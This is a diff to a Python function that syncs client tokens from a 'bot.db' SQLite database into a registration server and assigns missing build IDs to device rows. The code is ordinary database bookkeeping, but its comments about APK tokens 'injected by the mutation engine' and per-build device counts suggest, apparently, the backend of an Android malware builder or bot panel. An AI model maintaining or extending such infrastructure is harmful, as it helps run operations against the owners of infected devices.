@@ -166,6 +166,8 @@ def sync_clients_from_bot_db():
     Called on server startup and after every build completion.
     Ensures every APK token injected by the mutation engine is known to the
     registration server — no manual DB inserts required.
+    Also patches any existing bot.db devices rows that have build_id=NULL
+    so device counts show correctly under each build.
     """
     try:
         bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
@@ -177,9 +179,9 @@ def sync_clients_from_bot_db():
         rows = bot_db.execute(
             "SELECT token, profile_name, active FROM clients WHERE token IS NOT NULL AND token != ''"
         ).fetchall()
-        bot_db.close()
 
         if not rows:
+            bot_db.close()
             return
 
         dev_db = sqlite3.connect(DB_PATH, timeout=5)
@@ -201,6 +203,34 @@ def sync_clients_from_bot_db():
         dev_db.commit()
         dev_db.close()
         log.info(f"sync_clients_from_bot_db: synced {synced} client token(s)")
+
+        # ── Patch bot.db devices with NULL build_id ───────────────────────────
+        # Finds every device row missing a build_id and assigns it the latest
+        # build for that client. Fixes devices registered before this column
+        # was set, so counts show correctly in the bot's Build → Devices view.
+        null_devs = bot_db.execute(
+            """SELECT d.id, d.client_id, d.device_id
+               FROM devices d
+               WHERE d.build_id IS NULL"""
+        ).fetchall()
+
+        patched = 0
+        for d in null_devs:
+            build_row = bot_db.execute(
+                "SELECT id FROM builds WHERE client_id=? ORDER BY id DESC LIMIT 1",
+                (d["client_id"],)
+            ).fetchone()
+            if build_row:
+                bot_db.execute(
+                    "UPDATE devices SET build_id=? WHERE id=?",
+                    (build_row["id"], d["id"])
+                )
+                patched += 1
+
+        bot_db.commit()
+        bot_db.close()
+        if patched:
+            log.info(f"sync_clients_from_bot_db: patched build_id on {patched} device(s)")
 
     except Exception as e:
         log.warning(f"sync_clients_from_bot_db error: {e}")
